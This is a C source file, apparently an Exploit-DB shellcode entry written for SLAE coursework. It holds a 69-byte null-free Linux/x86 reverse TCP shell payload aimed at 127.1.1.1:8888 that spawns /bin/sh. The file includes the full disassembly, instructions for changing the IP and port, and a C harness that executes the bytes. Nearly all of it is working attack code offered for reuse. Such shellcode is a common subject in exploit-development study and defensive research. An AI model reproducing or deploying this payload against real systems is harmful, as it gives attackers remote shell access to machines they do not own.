/*
Title: Linux/x86 - Reverse TCP Shell (/bin/sh) (127.1.1.1:8888/TCP) Null-Free Shellcode (69 bytes)
Description: Smallest /bin/sh Reverse TCP Shellcode(Null Free, No Register Pollution Required)
Date : 4/Jan/2018
Author: Nipun Jaswal (@nipunjaswal) ; SLAE-1080

Details:
Smallest /bin/sh based Null & Register Pollution Free x86/linux Reverse Shell TCP (127.1.1.1:8888)( 69 Bytes )
You can modify the port and IP by changing the values for IP and PORT

Note:
If You are compiling the C file itself and dont care about Bad Chars, You can reduce 2 more bytes:

Change the following lines of code:
push word 0xb822
push word 2
To:
push 0xb8220002 ---> This will make the length of the Shellcode to 67 Bytes
*/
/*Disassembly of section .text:

08048060 <_start>:
 8048060:	31 db                	xor    ebx,ebx
 8048062:	53                   	push   ebx
 8048063:	43                   	inc    ebx
 8048064:	53                   	push   ebx
 8048065:	6a 02                	push   0x2
 8048067:	89 e1                	mov    ecx,esp
 8048069:	6a 66                	push   0x66
 804806b:	58                   	pop    eax
 804806c:	cd 80                	int    0x80
 804806e:	93                   	xchg   ebx,eax
 804806f:	59                   	pop    ecx

08048070 <loop>:
 8048070:	b0 3f                	mov    al,0x3f
 8048072:	cd 80                	int    0x80
 8048074:	49                   	dec    ecx
 8048075:	79 f9                	jns    8048070 <loop>
 8048077:	68 7f 01 01 01       	push   0x101017f
 804807c:	66 68 22 b8          	pushw  0xb822
 8048080:	66 6a 02             	pushw  0x2
 8048083:	89 e1                	mov    ecx,esp
 8048085:	b0 66                	mov    al,0x66
 8048087:	50                   	push   eax
 8048088:	51                   	push   ecx
 8048089:	53                   	push   ebx
 804808a:	b3 03                	mov    bl,0x3
 804808c:	89 e1                	mov    ecx,esp
 804808e:	cd 80                	int    0x80
 8048090:	52                   	push   edx
 8048091:	68 2f 2f 73 68       	push   0x68732f2f
 8048096:	68 2f 62 69 6e       	push   0x6e69622f
 804809b:	89 e3                	mov    ebx,esp
 804809d:	52                   	push   edx
 804809e:	53                   	push   ebx
 804809f:	89 e1                	mov    ecx,esp
 80480a1:	b0 0b                	mov    al,0xb
 80480a3:	cd 80                	int    0x80


EDB Note: Source ~ http://www.nipunjaswal.com/2018/01/tale-of-the-smallest-shellcode.html
*/

#include<stdio.h>
#include<string.h>
#define IP "\x7f\x01\x01\x01"
#define PORT "\x22\xb8"
int main(int argc, char* argv[])
{
	unsigned char code[] = \
	"\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x6a"
	"\x66\x58\xcd\x80\x93\x59\xb0\x3f\xcd\x80"
	"\x49\x79\xf9\x68"
	IP
	"\x66\x68"
	PORT
	"\x66\x6a\x02\x89\xe1\xb0\x66\x50"
	"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
	"\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
	printf("\nShellcode 1 Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}